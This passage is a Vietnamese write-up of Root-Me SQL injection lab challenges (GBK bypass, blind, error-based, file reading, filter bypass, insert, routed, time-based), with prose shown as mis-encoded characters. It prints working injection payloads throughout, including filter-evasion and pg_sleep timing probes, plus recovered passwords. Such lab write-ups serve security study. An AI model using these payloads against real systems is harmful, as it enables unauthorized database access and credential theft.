<p><img src="SQL-Injection/SQLinjection-AuthenticationGBK/./media/image4.png" alt="" /></p>
<p>Do ƒë√≥, ta c√≥ th·ªÉ l·ª£i d·ª•ng ƒëi·ªÅu n√†y ƒë·ªÉ khi·∫øn server t·ª± ƒë·ªông th√™m ‚Äú\‚Äù v√†o input (1 byte) v√†o input v√† t·ª´ ƒë√≥ khi·∫øn n√≥ tr·ªü th√†nh 1 k√Ω t·ª± ti·∫øng Trung:</p>
<ul>
<li>K√Ω t·ª± <code>\</code> c√≥ m√£ hex l√† <code>%5C</code> (ph√π h·ª£p v·ªõi lu·∫≠n ·ªü byte th·ª© 2)</li>
<li>V√¨ lu·∫≠t quy ƒë·ªãnh byte ƒë·∫ßu ti√™n trong kho·∫£ng <strong>81 ‚Äì FE</strong>, do ƒë√≥ ta ch·ªçn byte ƒë·∫ßu l√†<code> %81</code></li>
<li>Ta c√≥ k√Ω t·ª± ho√†n ch·ªânh sau khi nh·∫≠p <code>%81</code> v√†o s·∫Ω ƒë∆∞·ª£c convert sang <code>%81%5c</code> ~ <code>‰πó</code></li>
</ul>
<p><img src="SQL-Injection/SQLinjection-AuthenticationGBK/./media/image5.png" alt="" /></p>
<p>Gi·ªù ƒë·∫øn vi·ªác inject username, ta th·ª≠ v·ªõi payload: <code>login=admin%81'+or+1=1--+-&amp;password=1</code></p>
<p>D·ª± ƒëo√°n, server s·∫Ω convert n√≥ th√†nh: <code>login=admin%81%5C'+or+1=1--+-&amp;password=1</code></p>
<p>Hay: <code>login=admin‰πó'+or+1=1--+-&amp;password=1</code></p>
<p><img src="SQL-Injection/SQLinjection-AuthenticationGBK/./media/image6.png" alt="" /></p>
<p>Sau khi send request, Burp hi·ªÉn th·ªã Redirection, click v√†o th√¨ hi·ªÉn th·ªã flag:</p>
<p><img src="SQL-Injection/SQLinjection-AuthenticationGBK/./media/image7.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection---blind"><a class="header" href="#sql-injection---blind"><a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-blind">SQL Injection - Blind</a></a></h1>
<p>Th·ª≠ fuzz v·ªõi payload <code>admin‚Äô-- -</code> ta ƒë√£ access th√†nh c√¥ng qua Authentication v 0.02. Tuy v·∫≠y, website ch·∫≥ng tr·∫£ v·ªÅ cho th√¥ng tin password g√¨ c·∫£:</p>
<p><img src="SQL-Injection/SQLinjection-Blind/./media/image1.png" alt="" /></p>
<p>M·ªü burpsuite v√† t√¨m ki·∫øm th√¥i. Th·ª≠ thay ƒë·ªïi payload b·∫±ng c√°ch s·ª≠ d·ª•ng union select th√¨ ph√°t hi·ªán ra website ƒë√£ filter c√°c keyword ch√¥ng SQL Injection v·ªõi th√¥ng b√°o <strong>‚ÄúInjection detected‚Äù</strong>:</p>
<p><img src="SQL-Injection/SQLinjection-Blind/./media/image2.png" alt="" /></p>
<p>V·ªõi blind injection, ta th·ª±c hi·ªán m√≤ th·ª≠ v·ªõi c√°c c·∫•u tr√∫c m√† server database hay t·∫°o, fuzz th√¥i:</p>
<p><img src="SQL-Injection/SQLinjection-Blind/./media/image3.png" alt="" /></p>
<p>V·ªõi payload:</p>
<p><code>username=admin%27+AND+(select+username+from+sqlite_master)='admin'--+-&amp;password=admin%27--+-</code></p>
<p>Server tr·∫£ v·ªÅ l√† TRUE fuzz t√¨m password b·∫±ng substr() th√¥i!</p>
<ol>
<li><strong>T√¨m length(password):</strong></li>
</ol>
<p><img src="SQL-Injection/SQLinjection-Blind/./media/image4.png" alt="" /></p>
<ul>
<li>Length(password) == 8</li>
</ul>
<ol>
<li><strong>T√¨m password:</strong></li>
</ol>
<p>Payload ƒë·ªÉ fuzz:</p>
<p><em>username=admin%27+AND+substr((select+password+from+sqlite_master),1,1)='a'--+-&amp;password=admin%27--+-</em></p>
<p><img src="SQL-Injection/SQLinjection-Blind/./media/image5.png" alt="" /></p>
<p>Sau m·ªôt kho·∫£ng th·ªùi gian, ta ƒë√£ gh√©p ƒë∆∞·ª£c <code>password: e2a*********3i</code></p>
<p><img src="SQL-Injection/SQLinjection-Blind/./media/image6.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection---error"><a class="header" href="#sql-injection---error"><a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Error">SQL injection - Error</a></a></h1>
<p><img src="SQL-Injection/SQLinjection-errorbased/./media/image1.png" alt="" /></p>
<p>Website cung c·∫•p cho ta 2 tab (Authentication v√† Contents), tuy v·∫≠y, khi fuzz SQLi v√†o Authentication th√¨ kh√¥ng c√≥ k·∫øt qu·∫£ kh·∫£ thi. Chuy·ªÉn qua tab Contents, ta ph√°t hi·ªán ra website s·∫Ω res v·ªÅ l·ªói cho ta:</p>
<p><img src="SQL-Injection/SQLinjection-errorbased/./media/image2.png" alt="" /></p>
<p>Th·ª≠ fuzz c√°c payload d·ª±a v√†o <code>‚ÄúORDER BY‚Äù</code>:</p>
<p><img src="SQL-Injection/SQLinjection-errorbased/./media/image3.png" alt="" /></p>
<p><img src="SQL-Injection/SQLinjection-errorbased/./media/image4.png" alt="" /></p>
<p><img src="SQL-Injection/SQLinjection-errorbased/./media/image5.png" alt="" /></p>
<p>C√≥ th·ªÉ th·∫•y, v·ªõi <code>position==3</code> ho·∫∑c <code>VARCHAR/CHAR</code> type th√¨ database res v·ªÅ l·ªói. Nh∆∞ v·∫≠y, ta c·∫ßn ph·∫£i hi·∫øt 3 position c·ªßa database n√†y c≈©ng nh∆∞ d·ª±a v√†o type varibles ƒë·ªÉ attack. D·ª±a v√†o cheatsheet c·ªßa MySQL, ta c√≥ th·ªÉ s·ª≠ d·ª•ng <code>CAST ‚Ä¶ AS [type]</code> ƒë·ªÉ khi·∫øn database res v·ªÅ error khi postion kh√¥ng th·ªÉ l√† <code>VARCHAR/CHAR</code>. M·ªü burpsuite v√† th·ª≠ payload:</p>
<p><img src="SQL-Injection/SQLinjection-errorbased/./media/image6.png" alt="" /></p>
<p>L·ªói res v·ªÅ cho ta bi·∫øt, website s·∫Ω ch·ªâ hi·ªÉn th·ªã 1 row. ƒê·∫øn ƒë√¢y, ta c√≥ th·ªÉ s·ª≠ d·ª•ng LIMIT ƒë·ªÉ filter res v·ªÅ 1 row:</p>
<p><img src="SQL-Injection/SQLinjection-errorbased/./media/image7.png" alt="" /></p>
<ul>
<li>Table name: <code>m3mbr35t4bl3</code></li>
</ul>
<p><img src="SQL-Injection/SQLinjection-errorbased/./media/image8.png" alt="" /></p>
<ul>
<li>Column name (first column): <code>id</code></li>
</ul>
<p>ƒê·∫øn ƒë√¢y, ta c·∫ßn s·ª≠ d·ª•ng OFFSET ƒë·ªÉ c√≥ th·ªÉ filter v√†o ƒë√∫ng postion ta c·∫ßn LIMIT ƒë·ªÉ hi·ªÉn th·ªã c√°c column c√≤n l·∫°i:</p>
<p><img src="SQL-Injection/SQLinjection-errorbased/./media/image9.png" alt="" /></p>
<p><img src="SQL-Injection/SQLinjection-errorbased/./media/image10.png" alt="" /></p>
<ul>
<li>Username column: <code>us3rn4m3_c0l</code></li>
<li>Password column: <code>p455w0rd_c0l</code></li>
</ul>
<p><img src="SQL-Injection/SQLinjection-errorbased/./media/image11.png" alt="" /></p>
<p><img src="SQL-Injection/SQLinjection-errorbased/./media/image12.png" alt="" /></p>
<ul>
<li>Username c·ªßa admin: <code>admin</code></li>
<li>Password c·ªßa admin: <code>1a2BdKT5DIx3qxQN3UaC</code></li>
</ul>
<p><img src="SQL-Injection/SQLinjection-errorbased/./media/image13.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection--file-reading"><a class="header" href="#sql-injection--file-reading"><a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-file-reading">SQL injection ‚Äì File reading</a></a></h1>
<p><img src="SQL-Injection/SQLinjection-Filereading/./media/image1.png" alt="" /></p>
<p>·ªû tab Members, ta t√¨m ƒë∆∞·ª£c th√¥ng tin c∆° b·∫£n c·ªßa admin. T·ª´ ƒë√¢y, th·ª≠ fuzz v·ªõi URL b·∫±ng burpsuite ƒë·ªÉ t√¨m ki·∫øm ƒëi·ªÅu kh√°c bi·ªát:</p>
<p><img src="SQL-Injection/SQLinjection-Filereading/./media/image2.png" alt="" /></p>
<p>B·∫Øt ƒë·∫ßu t√¨m ki·∫øm s·ªë c·ªôt:</p>
<p><img src="SQL-Injection/SQLinjection-Filereading/./media/image3.png" alt="" /></p>
<ul>
<li>C√≥ 4 c·ªôt</li>
</ul>
<p>Sau m·ªôt h·ªìi fuzz, ta ƒë√£ t√¨m ƒë∆∞·ª£c c√°c b·∫£ng c·ªßa dtb:</p>
<p><img src="SQL-Injection/SQLinjection-Filereading/./media/image4.png" alt="" /></p>
<p>Payload: <code>id=1+and+0=1+union+select+group_concat(table_name),1,1,1+from+information_schema.tables--+-</code></p>
<p>Ta th·∫•y, c√≥ table <code>‚Äòmember‚Äô</code>, ti·∫øn h√†nh t√¨m column c·ªßa n√≥. Tuy nhi√™n, dtb ƒë√£ filter m·∫•t ti√™u:</p>
<p><img src="SQL-Injection/SQLinjection-Filereading/./media/image5.png" alt="" /></p>
<p>Th·ª≠ convert <code>‚Äòmember‚Äô</code> hex value: <code>0x6D656D626572</code></p>
<p><img src="SQL-Injection/SQLinjection-Filereading/./media/image6.png" alt="" /></p>
<ul>
<li><code>member_id,member_login,member_password,member_email</code></li>
</ul>
<p>T√¨m password th√¥i. Tuy nhi√™n, ƒë·∫øn l√∫c n√†y database k constaint table_name n·ªØa, ta c√≥ payload: <code>id=1+and+0=1+union+select+member_login,member_password,1,1+from+member</code></p>
<p><img src="SQL-Injection/SQLinjection-Filereading/./media/image7.png" alt="" /></p>
<p>ƒê·∫øn ƒë√¢y, ta nh·∫≠n ƒë∆∞·ª£c m·ªôt chu·ªói base64 nh∆∞ng decode ra kh√¥ng ph·∫£i password. Sau khi m√≤ m·∫´m v√¥ √≠ch, nh√¨n l·∫°i t√™n b√†i l√† file reading, ta c√≥ th·ªÉ ƒëo√°n r·∫±ng, t·∫•t c·∫£ s·∫Ω n·∫±m trong source code t·∫°i index.php. Ta s·∫Ω s·ª≠ d·ª•ng sqlmap ƒë·ªÉ t√¨m ra source web:</p>
<p><img src="SQL-Injection/SQLinjection-Filereading/./media/image8.png" alt="" /></p>
<p><img src="SQL-Injection/SQLinjection-Filereading/./media/image9.png" alt="" /></p>
<p>Source code cho ta th·∫•y, password ƒë√£ b·ªã hash b·∫±ng <strong>SHA1</strong>, sau ƒë√≥ b·ªã <strong>stringxor</strong> v·ªõi base64 c·ªßa ch√≠nh n√≥.</p>
<p><img src="SQL-Injection/SQLinjection-Filereading/./media/image10.png" alt="" /></p>
<p>Gi·ªù th√¨ hi·ªÉu n√≥ r·ªìi, ta s·ª≠ d·ª•ng python ƒë·ªÉ stringxor ng∆∞·ª£c l·∫°i th√†nh SHA1:</p>
<p><img src="SQL-Injection/SQLinjection-Filereading/./media/image11.png" alt="" /></p>
<ul>
<li>SHA1 password: <code>77be4fc97f77f5f48308942bb6e32aacabed9cef</code></li>
</ul>
<p><img src="SQL-Injection/SQLinjection-Filereading/./media/image12.png" alt="" /></p>
<ul>
<li>Password: <code>supe*********word</code></li>
</ul>
<p><img src="SQL-Injection/SQLinjection-Filereading/./media/image13.png" alt="" /></p>
<p><img src="SQL-Injection/SQLinjection-Filereading/./media/image14.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection--filter-bypass"><a class="header" href="#sql-injection--filter-bypass">S<a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Filter-bypass">QL Injection ‚Äì Filter bypass</a></a></h1>
<p>Challenge n√†y c√≥ c·∫•u tr√∫c t∆∞∆°ng t·ª± c√°c b√†i SQL ƒë√£ l√†m, tab Membres c√≥ c√¢u query <code>id=1</code> v√† ch·ªâ c√≥ ·ªü ƒë√¢y c√≥ th·ªÉ ti√™m payload v√†o. Tuy v·∫≠y, ƒë·ªùi kh√¥ng nh∆∞ l√† m∆°, ta b·ªã reject:</p>
<p><img src="SQL-Injection/SQLinjection-Filterbypass/./media/image1.png" alt="" /></p>
<p>M·ªü burpsuite l√™n v√† th·ª≠ fuzz t√¨m filter c·ªßa n√≥ th√¥i!</p>
<p>V·ªõi comment c·ªßa t√°c gi·∫£, ta ƒë√£ x√°c ƒë·ªãnh ƒë∆∞·ª£c database g·ªìm 4 c·ªôt:</p>
<p><img src="SQL-Injection/SQLinjection-Filterbypass/./media/image2.png" alt="" /></p>
<p>Sau 20 ph√∫t ng·ªìi fuzz kh√¥ng th√†nh, th√¥i th√¨ b·ªè v√†o intruder ƒë·ªÉ brute th·ª≠:</p>
<p><img src="SQL-Injection/SQLinjection-Filterbypass/./media/image3.png" alt="" /></p>
<p>C√≥ v·∫ª l√† server ƒë√£ ch·∫∑n h·∫øt c√°c t·ª´ kh√≥a lu√¥n. Stuck ti·∫øp 1 ti·∫øng. Th·ª≠ test l·∫°i v·ªõi uppercase c√°c keyword th√¨ th·∫•y qua ƒë∆∞·ª£c filter:</p>
<p><img src="SQL-Injection/SQLinjection-Filterbypass/./media/image4.png" alt="" /></p>
<ul>
<li>Uppercase c√°c keyword</li>
</ul>
<p>ƒê·ªùi kh√¥ng nh∆∞ l√† m∆°, ƒë·∫øn l√∫c n√†y, server filter h·∫øt c√°c k√Ω t·ª± <strong>‚Äú+‚Äù</strong>, <strong>‚Äú%20‚Äù</strong> v√† <strong>‚Äúwhitespace‚Äù</strong>:</p>
<p><img src="SQL-Injection/SQLinjection-Filterbypass/./media/image5.png" alt="" /></p>
<p>Stackoverflow b·∫£o h√£y th·ª≠ c√°c k√Ω t·ª± <strong>/</strong>/ %00 %09 %0a %0d** ƒë·ªÉ bypass. Th√¨ th·∫•y <code>%00</code> bypass ƒë∆∞·ª£c:</p>
<p><img src="SQL-Injection/SQLinjection-Filterbypass/./media/image6.png" alt="" /></p>
<p>Tuy nhi√™n, ti·∫øp t·ª•c fuzz v·ªõi <code>%00</code> th√¨ v·∫´n kh√¥ng c√≥ k·∫øt qu·∫£ g√¨ tr·∫£ v·ªÅ:</p>
<p><img src="SQL-Injection/SQLinjection-Filterbypass/./media/image7.png" alt="" /></p>
<p>Quay ng∆∞·ª£c l·∫°i th·ª≠ %09 (v√¨ l√∫c th·ª≠ ƒë·∫øn <code>%00</code> bypass ƒë∆∞·ª£c n√™n kh√¥ng th·ª≠ n·ªØa) th√¨ th·∫•y c≈©ng bypass ƒë∆∞·ª£c. Tra tr√™n URL Encoding th√¨ bi·∫øt ƒë√¢y l√† k√Ω t·ª± Tab:</p>
<p><img src="SQL-Injection/SQLinjection-Filterbypass/./media/image8.png" alt="" /></p>
<p>Ng·ªìi fuzz v√† ta ƒë√£ c√≥ payload c√≥ th·ªÉ ti√™m:
<code>1%09UNION%09SELECT%09*%09FROM%09membres%09LIMIT%091%09OFFSET%090</code></p>
<p>·ªû tr√™n, ta ƒë√£ bi·∫øt ƒë∆∞·ª£c 4 c·ªôt c·ªßa database. Gi·ªù th√¨ th·ª≠ th√°ch ti·∫øp theo l√† bypass d·∫•u <strong>‚Äò,‚Äô</strong>. Tuy nhi√™n, c√≥ v·∫ª nh∆∞ kh√¥ng c√≥ c√°ch n√†o thay th·∫ø ƒë∆∞·ª£c d·∫•u ‚Äò,‚Äô c·∫£.</p>
<p>Sau khi l∆∞·ª£n tr√™n c√°c m·∫∑t tr·∫≠n, em t√¨m ƒë∆∞·ª£c c·∫•u tr√∫c query s·ª≠ d·ª•ng cross join ƒë·ªÉ JOIN multi query trong subqueries ƒë·ªÉ c√≥ th·ªÉ truy xu·∫•t nhi·ªÅu c·ªôt kh√¥ng c·∫ßn s·ª≠ d·ª•ng <strong>‚Äòcomma‚Äô</strong>:
<code>union select * from ((select 1)A join (select 2)B join (select group_concat(user(),' ',database(),' ',@@datadir))C);</code></p>
<p><img src="SQL-Injection/SQLinjection-Filterbypass/./media/image9.png" alt="" /></p>
<p>Th·ª≠ √°p d·ª•ng payload tr√™n v√† c√°c l∆∞u √Ω t·ª´ ƒë·∫ßu, ta c√≥ payload:
<code>1 UNION SELECT * FROM (SELECT 123) AS a JOIN (SELECT 456) AS b JOIN (SELECT 123) AS c JOIN (SELECT pass FROM membres LIMIT 1) AS d) LIMIT 1 OFFSET 0</code></p>
<p>Payload ƒë·ªÉ ti√™m:
<code>1%09UNION%09SELECT%09*%09FROM%09((SELECT%09123)%09AS%09a%09JOIN%09(SELECT%09456)%09AS%09b%09JOIN%09(SELECT%09123)%09AS%09c%09JOIN%09(SELECT%09pass%09FROM%09membres%09LIMIT%091)%09AS%09d)%09LIMIT%091%09OFFSET%090</code></p>
<p><img src="SQL-Injection/SQLinjection-Filterbypass/./media/image10.png" alt="" /></p>
<p>Kh√¥ng hi·ªÉu sao n√≥ ch·ªâ tr·∫£ v·ªÅ gi√° tr·ªã nh∆∞ l√∫c ƒë·∫ßu ti√™m. Ng·ªìi stuck m·ªôt h·ªìi n·ªØa v√† th·ª≠ ƒë·ªïi payload th√¨ m·ªõi ph√°t hi·ªán ra qu√™n thay ƒë·ªïi OFFSET t·ª´ 0 1 v√¨ m√¨nh ƒë√£ query id=1. Thay ƒë·ªïi payload:
<code>1%09UNION%09SELECT%09*%09FROM%09((SELECT%09123)%09AS%09a%09JOIN%09(SELECT%09456)%09AS%09b%09JOIN%09(SELECT%09123)%09AS%09c%09JOIN%09(SELECT%09pass%09FROM%09membres%09LIMIT%091)%09AS%09d)%09LIMIT%091%09OFFSET%091</code></p>
<p><img src="SQL-Injection/SQLinjection-Filterbypass/./media/image11.png" alt="" /></p>
<ul>
<li>T√¨m ƒë∆∞·ª£c password: <strong>KLfgy</strong>**************<strong>sqli</strong></li>
</ul>
<p><img src="SQL-Injection/SQLinjection-Filterbypass/./media/image12.png" alt="" /></p>
<ul>
<li>Flag: "****************************"</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection---insert"><a class="header" href="#sql-injection---insert"><a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Insert">SQL injection - Insert</a></a></h1>
<p><img src="SQL-Injection/SQLinjection-Insert/./media/image1.png" alt="" /></p>
<p>Website cho ta 2 tab g·ªìm authentication v√† register. ·ªû Register, ta c√≥ th·ªÉ t√πy √Ω t·∫°o ƒë∆∞·ª£c account v√† kh√¥ng h·ªÅ c√≥ filter input.</p>
<p><img src="SQL-Injection/SQLinjection-Insert/./media/image2.png" alt="" /></p>
<p><img src="SQL-Injection/SQLinjection-Insert/./media/image3.png" alt="" /></p>
<p><img src="SQL-Injection/SQLinjection-Insert/./media/image4.png" alt="" /></p>
<p>T·ª´ ƒë√≥, ta x√°c ƒë·ªãnh ch·ªó ƒë·ªÉ ti√™m v√†o database. ·ªû tab register, ta c√≥ th·ªÉ th·∫•y website y√™u c√¢u 3 field g·ªìm username, password v√† email. Do ƒë√≥, database s·∫Ω th·ª±c hi·ªán t·∫°o user theo ki·ªÉu:
<code>INSERT INTO users VALUES (username, password, email)</code></p>
<p>Trong khi ƒë√≥, website kh√¥ng h·ªÅ filter email field v√† ta c√≥ th·ªÉ l·ª£i d·ª•ng bug n√†y ƒë·ªÉ c√≥ th·ªÉ INSERT th√™m c√°c gi√° tr·ªã ta mu·ªën v·ªõi multiple insertions v√† t·∫•n c√¥ng v√†o email field.</p>
<p><strong>Payload:</strong> <code>INSERT INTO users VALUES (username, password, email), (sth, sth, attack_payload)-- -</code></p>
<p><img src="SQL-Injection/SQLinjection-Insert/./media/image5.png" alt="" /></p>
<p>Login v√†o account, <code>ss, ss, (select version()):</code></p>
<p><img src="SQL-Injection/SQLinjection-Insert/./media/image6.png" alt="" /></p>
<ul>
<li>Database version(): <code>10.3.34-MariaDB-0ubuntu0.20.04.1</code></li>
</ul>
<p>Ti·∫øp t·ª•c, ta c·∫ßn fuzz ƒë·ªÉ t√¨m ra ƒë∆∞·ª£c table v√† column, nh∆∞ng khi th·ª≠ th√¨ b·ªã message <strong>‚ÄúRequest failed‚Äù</strong> cho ƒë·∫øn khi s·ª≠ d·ª•ng LIMIT th√¨ m·ªõi bi·∫øt l√† n√≥ b·ªã gi·ªõi h·∫°n:</p>
<p><img src="SQL-Injection/SQLinjection-Insert/./media/image7.png" alt="" /></p>
<p>Th·ª≠ s·ª≠ d·ª•ng trick v·ªõi OFFSET th√¨ ƒë∆∞·ª£c response <strong>‚ÄúAttack detected‚Äù.</strong></p>
<p><img src="SQL-Injection/SQLinjection-Insert/./media/image8.png" alt="" /></p>
<p>Login v√†o account v·ª´a INSERT, ta bi·∫øt ƒë∆∞·ª£c 1 table:</p>
<p><img src="SQL-Injection/SQLinjection-Insert/./media/image9.png" alt="" /></p>
<p>S·ª≠ d·ª•ng <strong>GROUP_CONCAT</strong> ƒë·ªÉ show c√°c table nh∆∞ng c√≥ v·∫ª kh√¥ng c√≥ tables n√†o c√≥ th√¥ng tin user ho·∫∑c flag m√† to√†n l√† c√°c table kh√°c.:</p>
<p><img src="SQL-Injection/SQLinjection-Insert/./media/image10.png" alt="" /></p>
<p><img src="SQL-Injection/SQLinjection-Insert/./media/image11.png" alt="" /></p>
<p>Th·ª≠ xem l·∫°i version, ta th·∫•y server s·ª≠ d·ª•ng MariaDB. Sau m·ªôt h·ªìi stuck v√† check cheatsheet, ta c√≥ th·ªÉ s·ª≠ d·ª•ng <strong>information_schema.processlist</strong> ƒë·ªÉ check c√°c thread ƒëang th·ª±c thi c·ªßa server database (v√¨ user c√≥ th·ªÉ reg b·∫•t c·ª© l√∫c n√†o). L√∫c n√†y, ta c√≥ th·ªÉ ki·ªÉm tra table <strong>INFO</strong> ƒë·ªÉ c√≥ th·ªÉ xem server s·∫Ω th·ª±c thi c√°i g√¨ khi reg account (<a href="https://mariadb.com/kb/en/information-schema-processlist-table/">Information Schema PROCESSLIST Table - MariaDB Knowledge Base</a>):</p>
<p><img src="SQL-Injection/SQLinjection-Insert/./media/image12.png" alt="" /></p>
<p>Reg acc ƒë·ªÉ show table <strong>INFO</strong> c·ªßa <strong>information_schema.processlist</strong>:</p>
<p><img src="SQL-Injection/SQLinjection-Insert/./media/image13.png" alt="" /></p>
<p><img src="SQL-Injection/SQLinjection-Insert/./media/image14.png" alt="" /></p>
<p>Payload th·ª±c thi c·ªßa server:</p>
<p><em><strong>INSERT INTO <code>membres</code> ( <code>username</code>, <code>password</code>, <code>email</code>)</strong></em></p>
<ul>
<li>Table c·∫ßn t√¨m: <strong>membres</strong></li>
</ul>
<p>Show c√°c column c·ªßa membres table:</p>
<p><img src="SQL-Injection/SQLinjection-Insert/./media/image15.png" alt="" /></p>
<p>Tuy v·∫≠y, ta ch·∫≥ng ki·∫øm ƒë∆∞·ª£c b·∫•t k·ª≥ th√¥ng tin n√†o t·ª´ b·∫£ng membres n√†y c·∫£</p>
<p>Sau 2 ti·∫øng stuck, v√¨ qu√° b·∫•t l·ª±c, em quy·∫øt ƒë·ªãnh s·ª≠ d·ª•ng burpsuite ƒë·ªÉ bruteforce t·∫•t c·∫£ c√°c table c·ªßa <strong>information_schema.tables:</strong></p>
<ul>
<li>Auto register account:</li>
</ul>
<p><img src="SQL-Injection/SQLinjection-Insert/./media/image16.png" alt="" /></p>
<ul>
<li>Auto login:</li>
</ul>
<p><img src="SQL-Injection/SQLinjection-Insert/./media/image17.png" alt="" /></p>
<ul>
<li>Sau khi xem qua c√°c table m√† bruteforce gi√∫p ta leak, ta ƒë√£ t√¨m ƒë∆∞·ª£c ƒë√∫ng table c·∫ßn t√¨m :</li>
</ul>
<p><img src="SQL-Injection/SQLinjection-Insert/./media/image18.png" alt="" /></p>
<p>ƒê·∫øn ƒë√¢y, ta th·ª±c hi·ªán t√¨m column trong flag table:</p>
<ul>
<li>Payload: <code>username=uuysyy&amp;password=123&amp;email=gg'),('cgc','123',(select column_name from information_schema.columns where table_name='flag' limit 0,1))-- -</code></li>
</ul>
<p><img src="SQL-Injection/SQLinjection-Insert/./media/image19.png" alt="" /></p>
<p>Gi·ªù th√¨ t√¨m flag: <code>username=sadadas&amp;password=123&amp;email=gg'),('cvb','123',(select flag from flag limit 0,1))-- -</code></p>
<p><img src="SQL-Injection/SQLinjection-Insert/./media/image20.png" alt="" /></p>
<ul>
<li>Flag: ******************************</li>
</ul>
<p><img src="SQL-Injection/SQLinjection-Insert/./media/image21.png" alt="" /></p>
<ul>
<li>Flag: ******************************</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection-routed"><a class="header" href="#sql-injection-routed"><a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-Injection-Routed">SQL-Injection-Routed</a></a></h1>
<p><img src="SQL-Injection/SQLinjection-Routed/./media/image1.png" alt="" /></p>
<p>Th·ª≠ login v√† intercept request, ta c√≥ ƒë∆∞·ª£c k·∫øt qu·∫£:</p>
<p><img src="SQL-Injection/SQLinjection-Routed/./media/image2.png" alt="" /></p>
<p>C√≥ v·∫ª nh∆∞ kh√≥ c√≥ th·ªÉ bypass ƒë∆∞·ª£c ·ªü h√†m login n√†y khi request tr·∫£ v·ªÅ:</p>
<p><img src="SQL-Injection/SQLinjection-Routed/./media/image3.png" alt="" /> Chuy·ªÉn qua tab Search, khi query ta ƒë·ªÅu nh·∫≠n ƒë∆∞·ª£c k·∫øt qu·∫£ tr·∫£ v·ªÅ d·ª±a tr√™n query:</p>
<p><img src="SQL-Injection/SQLinjection-Routed/./media/image4.png" alt="" /></p>
<p>Ta s·∫Ω attack v√†o ƒë√¢y v·ªõi payload <code>‚Äò union select 1 from information_schema-- -</code> th√¨ nh·∫≠n ƒë∆∞·ª£c response <strong>‚ÄúAttack detected!‚Äù</strong>:</p>
<p><img src="SQL-Injection/SQLinjection-Routed/./media/image5.png" alt="" /> Th·ª≠ fuzz ta bi·∫øt ƒë∆∞·ª£c, input s·∫Ω filter c√°c k√Ω t·ª± nh∆∞ ‚Äò,‚Äô, c√°c k√Ω t·ª± c√≥ th·ªÉ li√™n quan ƒë·∫øn SQLi. Tuy nhi√™n kh√¥ng filter m·ªôt v√†i t·ª´ nh∆∞ union, select,‚Ä¶</p>
<p>T√¨m hi·ªÉu v·ªÅ Routed SQL (<a href="https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt">https://repository.root-me.org/Exploitation - Web/EN - Routed SQL Injection - Zenodermus Javanicus.txt</a>) ta c√≥ th·ªÉ t√¨m ƒë∆∞·ª£c th√¥ng tin:</p>
<p>In simple words routed SQL injection can be a scenario when you are not able to see any output after using "union select", earlier when i was playing with SQLi i found a website where i wasnt getting any output so it just striked through my mind that may be the output is not coming to the page then it must be going somewhere, and that somewhere is an another sql query.</p>
<p>Nghƒ© l√†, khi ta inject v·ªõi union select th√¨ s·∫Ω kh√¥ng th·ªÉ th·∫•y ƒë∆∞·ª£c input c·ªßa c√¢u inject ƒë√≥.</p>
<p>Payload: <code>'union select login,password from users-- -</code></p>
<p>Convert sang hexa: <code>0x27756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d202d</code></p>
<p><img src="SQL-Injection/SQLinjection-Routed/./media/image6.png" alt="" /></p>
<ul>
<li>Flag: *********************</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection--time-based"><a class="header" href="#sql-injection--time-based"><a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Time-based">SQL Injection ‚Äì Time-based</a></a></h1>
<p>V·ªÅ SQLi Time-based, ƒë√¢y l√† m·ªôt lo·∫°i SQLi Blind khi ta s·ª≠ d·ª•ng th·ªùi gian res c·ªßa req ƒë·ªÉ d·ª± ƒëo√°n th√¥ng tin v√† BurpSuite s·∫Ω h·ªó tr·ª£ r·∫•t t·ªët v·ªÅ m·∫£ng n√†y. Khi ta s·ª≠ d·ª•ng m·ªôt c√¢u Query ƒë√∫ng, th·ªùi gian ph·∫£n h·ªìi s·∫Ω ch·∫≠m v√† ng∆∞·ª£c l·∫°i.</p>
<p>Trong website, ta c√≥ m·ªôt tab l√† Memberlist, c√≥ query nh∆∞ sau:</p>
<p><em>http://challenge01.root-me.org/web-serveur/ch40/?action=memberlist&amp;member=<strong>[x]</strong></em></p>
<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image1.png" alt="" /></p>
<p>·ªû ƒë√¢y, ta c√≥ th·ªÉ l·ª£i d·ª•ng ƒë·ªÉ th·ª±c hi·ªán ti√™m payload v√†o ƒë·∫±ng sau n√≥ v√† th·ª±c hi·ªán blind. Th·ª≠ blind v·ªõi payload b·∫±ng nhi·ªÅu version() database kh√°c nhau:</p>
<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image2.png" alt="" /></p>
<p>Payload: <em>3;select+case+when+(0=0)+then+pg_sleep(10)+else+pg_sleep(-1)+end--</em></p>
<p>Payload n√†y s·∫Ω khi·∫øn dtb res ch·∫≠m h∆°n v·ªõi pg_sleep() khi query ƒë√∫ng.</p>
<ul>
<li>Server thu·ªôc d·∫°ng Postgresql: <a href="https://pgpedia.info/p/pg_sleep.html">pg_sleep() - pgPedia - a PostgreSQL Encyclopedia</a></li>
</ul>
<p>T·ª´ ƒë√≥, ta s·∫Ω s·ª≠ d·ª•ng Burp Intruder ƒë·ªÉ th·ª±c hi·ªán bruteforce table_name, column_name nh∆∞ c√°c b√†i SQLi ƒë√£ l√†m.</p>
<ol>
<li><strong>T√¨m table_name</strong></li>
</ol>
